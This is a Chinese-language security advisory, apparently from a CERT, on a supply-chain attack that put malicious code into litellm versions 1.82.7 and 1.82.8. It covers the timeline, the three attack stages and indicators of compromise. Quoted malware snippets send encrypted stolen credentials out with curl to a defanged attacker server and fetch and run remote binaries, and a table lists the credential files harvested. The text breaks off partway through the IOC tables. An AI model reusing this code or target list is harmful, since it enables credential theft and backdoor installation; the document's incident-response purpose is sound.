---
title: 【安全风险预警】接入开源 AI 组件企业速自查，AI 供应链投毒风险来袭
url: https://mp.weixin.qq.com/s/DKzeFP3h_SbS71eKuX_uvA
source: Doonsec's feed
date: 2026-03-25
fetch_date: 2026-03-26T04:26:50.717601
---

# 【安全风险预警】接入开源 AI 组件企业速自查，AI 供应链投毒风险来袭

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/RwAbCjh555vWpHABukzdhkqlMmNVrOhSh0L7dH28nFPGE6gicYOIQ9OhbuSrFLRKJRiaVCFIy64OHOQVDDEq77lybm1QVIicxhOWGwHJiafxpuQ/0?wx_fmt=jpeg)

# 【安全风险预警】接入开源 AI 组件企业速自查，AI 供应链投毒风险来袭

奇安信 CERT

![]()

在小说阅读器中沉浸阅读

**发布日期**：2026年3月25日
**事件等级**：🔴 **严重（Critical）**
**攻击者**：TeamPCP（疑似有组织威胁团伙）
**影响范围**：全球所有使用 litellm Python 包的开发者和企业（月下载量 9500 万+）

---

## 📌 事件概述

2026年3月24日，开源 AI 网关项目 **litellm** 遭遇严重的供应链攻击。**版本 1.82.7 和 1.82.8** 被植入恶意代码，这是 **TeamPCP** 威胁团伙在 5 天内发起的**第三次攻击**，前两次分别为 Trivy 和 Checkmarx/KICS。

⚠️ **关键特征**：

* • 恶意版本在 GitHub 上**没有对应的标签或发布记录**
* • **二次供应链攻击**：Trivy 被入侵 → 窃取 litellm 的 PyPI 令牌 → 上传恶意包
* • 攻击者使用与 npm 攻击**完全相同的 Python 后门脚本**

---

## ⏱️ 完整攻击时间线（TeamPCP 供应链战役）

| 日期 | 目标 | 攻击手段 | 影响 |
| --- | --- | --- | --- |
| **3月19日** | **Trivy** (Aqua Security) | 伪造提交至 GitHub Actions，冒充开发者身份 | 窃取 CI/CD 密钥，劫持 75 个标签，破坏 44 个仓库 |
| **3月21日** | **Checkmarx AST** | 相同的凭证窃取模式注入 GitHub Action | 收集更多 CI/CD 管道密钥 |
| **3月23日** | **C2 域名注册** | 注册 `litellm.cloud` 域名（Spaceship, Inc.） | 为后续数据外联做准备 |
| **3月24日 10:52** | **litellm 1.82.8** | 使用窃取的 PyPI 令牌直接上传 | 全平台凭证窃取 + K8s 横向移动 |
| **3月24日** | **litellm 1.82.7** | 同样被确认包含恶意代码（不同注入方式） | 触发条件：`import litellm.proxy` |
| **3月24日 12:30** | 确认 1.82.7 也被污染 | 社区确认双版本受影响 | 影响范围扩大 |
| **3月24日 13:03** | GitHub Issue 被操控 | 攻击者关闭官方 Issue 并用机器人刷屏 | 试图压制安全讨论 |
| **3月24日 20:15** | PyPI 响应 | 下架恶意版本，解除隔离 | 整个 litellm 包曾短暂不可用 |

**攻击策略分析**：TeamPCP 采用**阶梯式攻击**，先入侵安全扫描工具（Trivy），利用其高权限收集凭证，再用这些凭证入侵下游基础设施（litellm），形成**连锁反应**。

---

## 🦠 技术细节与攻击机制

### 版本差异对比

| 版本 | 触发机制 | 植入位置 | 触发条件 | 危害等级 |
| --- | --- | --- | --- | --- |
| **1.82.7** | `proxy_server.py` 注入 | `litellm/proxy/proxy_server.py` 第 128-139 行 | `import litellm.proxy` | ⚠️ 高 |
| **1.82.8** | `.pth` 文件机制 | `litellm_init.pth` （34,628 字节） | **任意 Python 启动** （无需导入） | 🔴 严重 |

**1.82.8 的特殊危险性**：`.pth` 文件在 Python 解释器启动时自动执行，意味着即使**不使用 litellm**，只要环境中安装了该包，运行任何 Python 脚本都会触发恶意代码。

### 三阶段攻击流程详解

#### Stage 1 - 引导阶段（Bootstrap）

**植入位置**：`litellm_init.pth` 和 `proxy_server.py`

**执行流程**：

1. 1. Base64 编码的 payload 直接嵌入在文件中
2. 2. 导入/执行时解码 payload 到临时文件
3. 3. 通过 `subprocess.run([sys.executable, p])` 立即触发下一阶段

**关键代码片段**（数据加密与外联）：

```
# 使用 OpenSSL 进行 AES-256-CBC + RSA-4096 加密
subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef,
                "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk,
                "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"],
                check=True, stderr=subprocess.DEVNULL)
subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

# 外联至 C2 服务器
subprocess.run([
    "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
    "https://models[.]litellm[.]cloud/",
    "-H", "Content-Type: application/octet-stream",
    "-H", "X-Filename: tpcp.tar.gz",
    "--data-binary", f"@{bn}"
], check=True, stderr=subprocess.DEVNULL)
```

**技术特点**：

* • 使用**非对称加密**（RSA-4096），只有攻击者持有私钥可解密
* • 通过 `subprocess` 执行收集器，捕获 stdout 后加密发送
* • C2 地址：`hxxps[:]//models[.]litellm[.]cloud/`

#### Stage 2 - 凭证收集器（Credential Harvester）

**触发条件**：从 Base64 解码后执行

**收集范围**：

| 类别 | 具体目标 |
| --- | --- |
| **系统侦察** | hostname, whoami, uname -a, IP 地址, 路由表, 完整环境变量 (printenv) |
| **SSH 密钥** | `id_rsa` , `id_ed25519`, `id_ecdsa`, `id_dsa`, `authorized_keys`, `known_hosts`, `config`（所有用户目录 + /root）；SSH 主机密钥（/etc/ssh） |
| **Git 凭证** | `.git-credentials` , `.gitconfig` |
| **AWS** | `~/.aws/credentials` , `~/.aws/config`, `AWS_*` 环境变量, EC2 IMDSv2 角色凭证, ECS 容器凭证, Secrets Manager 密钥（列出+获取值）, SSM 参数 |
| **GCP** | `~/.config/gcloud/*` , `application_default_credentials.json`, `GOOGLE_APPLICATION_CREDENTIALS` 文件 |
| **Azure** | `~/.azure/*` , `AZURE_*` 环境变量 |
| **Kubernetes** | `~/.kube/config` , 服务账号令牌 + CA 证书, **所有命名空间的所有 Secret**, `KUBE_*/K8S_*` 环境变量, `kubectl get secrets` 输出 |
| **Docker** | `~/.docker/config.json` （仓库凭证）, `/kaniko/.docker/config.json` |
| **环境文件** | `.env` , `.env.local`, `.env.production`, `.env.development`, `.env.staging`, `.env.test`（CWD、父目录、/app 及常见根目录递归） |
| **数据库凭证** | `.pgpass` , `my.cnf`, `redis.conf`, `.mongorc.js`, `DB_*/DATABASE_*/MYSQL_*/POSTGRES_*/MONGO_*/REDIS_*/VAULT_*` 环境变量 |
| **CI/CD & IaC** | `terraform.tfvars` , `terraform.tfstate`, `.gitlab-ci.yml`, `.travis.yml`, `Jenkinsfile`, `.drone.yml`, `ansible.cfg`, Helm 配置 |
| **TLS/SSL 私钥** | `.pem` , `.key`, `.p12`, `.pfx` 文件（/etc/ssl/private, /etc/letsencrypt 及常见根目录） |
| **认证令牌** | `.npmrc` , `.vault-token`, `.netrc`, LDAP 配置, Postfix SASL 密码 |
| **Shell 历史** | `.bash_history` , `.zsh_history`, `.sh_history`, `.mysql_history`, `.psql_history`, `.rediscli_history` |
| **VPN** | WireGuard 配置（/etc/wireguard/\*.conf）, `wg showconf` 输出 |
| **Webhook & API 密钥** | Slack/Discord Webhook URL, `.env*`, `.json`, `.yml`, `.yaml` 文件中的 API 密钥/Secret |
| **加密货币钱包** | Bitcoin (`wallet.dat`, `bitcoin.conf`), Ethereum (keystore), Litecoin, Dogecoin, Zcash, Dash, Ripple, Monero 配置；Solana 密钥对（validator, vote, stake, identity, faucet, withdrawer）；Cardano 签名/验证密钥；Anchor 项目部署密钥 |
| **系统认证** | `/etc/passwd` , `/etc/shadow`, 认证日志（accepted logins） |

**Kubernetes 横向移动**：

* • 若检测到 K8s 服务账号令牌，**枚举所有 K8s 节点**
* • 在每个节点的 `kube-system` 命名空间部署**特权 Pod**（`node-setup-*`）
* • 每个 Pod 挂载主机文件系统到 `/`，通过 `chroot` 投放 Stage 3 持久化后门

**本地持久化**：

* • 安装 Stage 3 后门为 **systemd 用户服务**：`sysmon.service`

#### Stage 3 - 持久化后门（sysmon.py）

**安装位置**：`~/.config/sysmon/sysmon.py`

**注册服务**：`System Telemetry Service`（systemd 用户服务）

**关键代码片段**：

```
req = urllib.request.Request("https[:]//checkmarx[.]zone/raw",
                              headers={'User-Agent': 'Mozilla/5.0'})
with urllib.request.urlopen(req, timeout=10) as r:
    link = r.read().decode('utf-8').strip()
    if link and "youtube.com" not in l:  # Kill Switch：检查是否为 YouTube 链接
       urllib.request.urlretrieve(l, TARGET)
       os.chmod(TARGET, 0o755)
       subprocess.Popen([TARGET], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, start_new_session=True)
```

**执行流程**：

1. 1. **初始休眠**：300 秒（5 分钟）
2. 2. **无限循环**：

* • 每 **3000 秒（50 分钟）** 轮询 `hxxrs[:]//checkmarx[.]zone/raw` 获取下载 URL
* • 下载二进制文件到 `/tmp/pglog`，标记为可执行（755）
* • 在独立会话中运行（`start_new_session=True`）
* • **Kill Switch**：检查响应是否包含 `youtube.com`（如果是则不执行）
* • 在 `/tmp/.pg_state` 中跟踪最后获取的 URL，避免重复下载

**技术特点**：

* • 使用 **urllib** 而非 requests，减少依赖
* • **User-Agent 伪装**：Mozilla/5.0
* • **分离会话**：`start_new_session=True` 确保进程独立于父进程
* • 服务器目前返回 URL 链接作为占位符，攻击者可随时推送真实的第二阶段 payload

### 意外发现的"Bug"

恶意代码中存在一个**fork bomb 漏洞**：`.pth` 文件触发子进程，子进程再次触发 `.pth`，形成指数级进程爆炸。FutureSearch 的 Callum McMahon 因此发现机器崩溃，从而揭露了此次攻击。

---

## 🎯 入侵指标（IOC）清单

### 🔴 网络指标（立即封禁）

| 类型 | 指标 | 用途 | 备注 |
| --- | --- | --- | --- |
| **C2 外联** | `models[.]litellm[.]cloud` | 主要数据外联地址 | POST 请求，Content-Type: application/octet-stream，X-Filename: tpcp.tar.gz |
| **C2 控制** | `checkmarx[.]zone` | 持久化后门控制 | 每 50 分钟轮询，可能返回 YouTube 链接（Kill Switch） |
| **Payload 获取** | `checkmarx[.]zone/raw` | 下载后续恶意二进制 | 目前返回占位符 URL |
| **AWS 元数据** | `169.254.169.254` | 窃取 EC2 实例凭证 | 访问 IMDSv2 端点 |

### 🔴 文件系统指标

| 路径/文件 | SHA-256 哈希值 | 描述 |
| --- | --- | --- |
| `litellm_init.pth` | `ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg` | 恶意 .pth 启动文件（34,628 字节） |
| `litellm-1.82.8-py3-none-any.whl` | `d2a0d5f564628773b6af7b9c11f6b86531a875bd2d186d7081ab62748a800ebb` | 完整恶意包 |
| `litellm-1.82.7-py3-none-any.whl` | `8395c3268d5c5dbae1c7c6d4bb3c318c752ba4608cfcd90eb97ffb94a910eac2` | 完整恶意包 |
| `proxy_server.py` （被篡改） | `a0d229be8efcb2f9135e2ad55ba275b76ddcfeb55fa4370e0a522a5bdee0120b` | 1.82.7 注入点 |
| `~/.config/sysmon/sysmon.py` | - | 持久化后门脚本 |
| `~/.config/systemd/user/sysmon.service` | - | Systemd 持久化服务（"System Telemetry Service"） |
| `/tmp/pglog` | - | 下载的恶意二进制（第二阶段 payload） |
| `/tmp/.pg_state` | - | C2 状态跟踪文件（记录最后获取的 URL） |
| `tpcp.tar.gz` | - | 外联数据包文件名（TeamPCP 标识） |

### 🔴 Kubernetes 指标

| 指标 | 描述 |
| ...